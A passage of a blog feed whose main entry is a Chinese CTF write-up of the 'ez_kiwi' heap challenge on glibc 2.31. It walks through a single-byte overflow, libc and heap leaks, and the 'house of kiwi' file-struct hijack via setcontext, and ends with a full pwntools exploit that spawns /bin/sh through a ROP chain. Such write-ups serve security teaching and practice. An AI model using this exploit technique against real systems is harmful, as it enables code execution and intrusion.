    <content type="html"><![CDATA[<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>题目环境：glibc-2.31</p><p>如图在edit的过程中对重新输入的字符长度未有效检查，造成单字节溢出。</p><p><img src="/img/1/1.png"></p><p> 这时我们就可利用这一漏洞让堆块重叠，从而泄漏libc的地址</p><p>泄漏libc的地址首先想到的就是unsorted bin中的main_arena，由于存在tcache，必须释放8个大小相同才会进入unsorted bin；在add的过程中输入的idx可以小于0xf，但实际上超过9就无法正常申请，所以我们在申请释放时要小心堆块不够和top chunk的合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):          <br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#重叠的堆块</span><br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#先释放进入tcache，不会top chunk的合并</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>这时就可以得到libc的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure><p>一般情况下我们会修改tcache的fd指针，指向<code>__malloc_hook</code>和<code>__free_hook</code>,再次申请时就使用system或者one_gadget去填充该地址。但是这题故意不让你去这样去使用，每次重新开始循环时会调用clear函数将<code>__malloc_hook</code>和<code>__free_hook</code>全部重置为0。</p><img src="/img/1/2.png"  /><p><img src="/img/1/3.png"></p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>这时我们就需要使用house of kiwi这种方式，修改<code>_IO_file_sync</code>和<code>_IO_helper_jumps</code>中的值。</p><p>具体过程便是触发<code>__malloc_assert</code>后，去执行fflush (stderr)，会使用<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>，RDX寄存器的值为<code>IO_helper_jumps</code>指针,RDX始终是一个固定的地址。</p><img src="/img/1/5.png"><p>然后<strong>通过 setcontext 控制寄存器的值</strong>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f38b563d0dd</span> &lt;+<span class="hljs-number">61</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa0</span>]#利用代码<br>   <span class="hljs-number">0x00007f38b563d0e4</span> &lt;+<span class="hljs-number">68</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f38b563d0eb</span> &lt;+<span class="hljs-number">75</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f38b563d0ef</span> &lt;+<span class="hljs-number">79</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f38b563d0f3</span> &lt;+<span class="hljs-number">83</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f38b563d0f7</span> &lt;+<span class="hljs-number">87</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f38b563d0fb</span> &lt;+<span class="hljs-number">91</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f38b563d0ff</span> &lt;+<span class="hljs-number">95</span>&gt;:    <span class="hljs-keyword">test</span>   <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x48</span>,<span class="hljs-number">0x2</span><br>   <span class="hljs-number">0x00007f38b563d10b</span> &lt;+<span class="hljs-number">107</span>&gt;:   <span class="hljs-keyword">je</span>     <span class="hljs-number">0x7f38b563d1c6</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;<br>   …………<br>   …………<br>   <span class="hljs-number">0x00007f38b563d1c6</span> &lt;+<span class="hljs-number">294</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa8</span>]#利用代码<br>   <span class="hljs-number">0x00007f38b563d1cd</span> &lt;+<span class="hljs-number">301</span>&gt;:   <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f38b563d1ce</span> &lt;+<span class="hljs-number">302</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f38b563d1d2</span> &lt;+<span class="hljs-number">306</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f38b563d1d6</span> &lt;+<span class="hljs-number">310</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f38b563d1dd</span> &lt;+<span class="hljs-number">317</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f38b563d1e1</span> &lt;+<span class="hljs-number">321</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f38b563d1e5</span> &lt;+<span class="hljs-number">325</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f38b563d1ec</span> &lt;+<span class="hljs-number">332</span>&gt;:   <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f38b563d1ee</span> &lt;+<span class="hljs-number">334</span>&gt;:   <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>设置<code>rdx + 0xa0</code>来控制rsp，也就是控制了栈的地址，通过最后的ret指令就可以执行ROP。</p><p>攻击流程如下</p><p>将<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>修改为<code>setcontext + 61</code>的地址，让程序执行setcontext中的代码；同时修改<code>_IO_helper_jumps + 0xa0 和 _IO_helper_jumps + 0xa8</code>分别存放有ROP的位置和ret指令的gadget位置。题目提供了libc文件，只需在libc中找到相应的gadget再加上libc的基地址即可，可以通过泄漏堆的地址来存放gadget。</p><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>关于IO_helper_jumps的地址寻找：由于pwntools无法从文件直接得到IO_helper_jumps的信息，于是我们可以直接通过这道题提供的libc文件利用ida中找到偏移；但如果是从pwndbg中寻找，找到的地址并不是<code>_IO_file_sync</code>中所利用的那个地址，对比下图和上图就会发现需要-0xc0才是我们所需要的地址。</p><p><img src="/img/1/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br></code></pre></td></tr></table></figure><p> 利用0x20大小的堆块重叠，可以修改tcache中的fd指针，就可对<code>IO_file_jumps</code>的地址修改，并泄漏堆的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br></code></pre></td></tr></table></figure><p>使用ROPgadget 找到相应的gadget，利用系统调用去执行execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) （储存&#x2F;bin&#x2F;sh的地址自己找好偏移即可）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br></code></pre></td></tr></table></figure><p>继续利用0x20大小的堆块重叠，去修改<code>_IO_helper_jumps + 0xa0 和 _IO_helper_jumps + 0xa8</code>中的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br></code></pre></td></tr></table></figure><p>关于触发<code>__malloc_assert</code>：在top chunk不够使用时就使用sysmalloc，同时对top chunk进行一系列检查，这里我们不是为了绕过检查，而是故意让其不能通过检查。这里改变top chunk的大小，使其不能页对齐，并使用gift()函数申请0x25000大小的堆块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br></code></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ez_kiwi&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ez_kiwi&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27690</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;give me your name:\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;How much do you want?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to put?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Tell me your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to look?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to change?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Change your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br><br>leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br>ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br><span class="hljs-comment">#add(0x80, 9, b&#x27;a&#x27;)</span><br><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p> 参考：<a href="https://www.anquanke.com/post/id/235598">House OF Kiwi - 安全客，安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/11/01/Hello-world/"/>
    <url>/2022/11/01/Hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello World</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">avatar:</span> <span class="hljs-string">&quot;https://xtxtn.github.io/img/my.jpg&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/10/31/2022-10-31/"/>
    <url>/2022/10/31/2022-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="2022-10-31"><a href="#2022-10-31" class="headerlink" title="2022-10-31"></a>2022-10-31</h2><p><strong>Happy halloween</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
